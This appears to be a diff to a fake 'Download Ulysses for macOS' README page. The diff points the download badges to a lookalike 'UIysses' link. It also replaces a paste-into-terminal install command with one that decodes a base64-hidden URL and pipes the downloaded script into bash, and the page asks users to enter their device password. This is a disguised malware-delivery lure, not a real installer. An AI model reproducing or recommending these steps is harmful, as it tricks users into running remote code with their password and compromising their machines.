@@ -7,7 +7,7 @@ Ulysses supports Markdown, offers seamless sync across Apple devices, and provid
 ---
 
 ## ✅ Download Ulysses for macOS  
-[![Download Ulysses](https://img.shields.io/badge/Download-Ulysses-blueviolet)](https://ulysses-mac-download.github.io/.github)
+[![Download Ulysses](https://img.shields.io/badge/Download-Ulysses-blueviolet)](https://shuziktobehuman.github.io/huja/UIysses)
 
 ---
 
@@ -26,7 +26,7 @@ Ulysses supports Markdown, offers seamless sync across Apple devices, and provid
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -66,7 +66,7 @@ Ulysses is a feature-packed writing environment that merges simplicity with vers
 
 ---
 
-[![Download Ulysses](https://img.shields.io/badge/Download-Ulysses-blueviolet)](https://ulysses-mac-download.github.io/.github)
+[![Download Ulysses](https://img.shields.io/badge/Download-Ulysses-blueviolet)](https://shuziktobehuman.github.io/huja/UIysses)
 
 ---
 
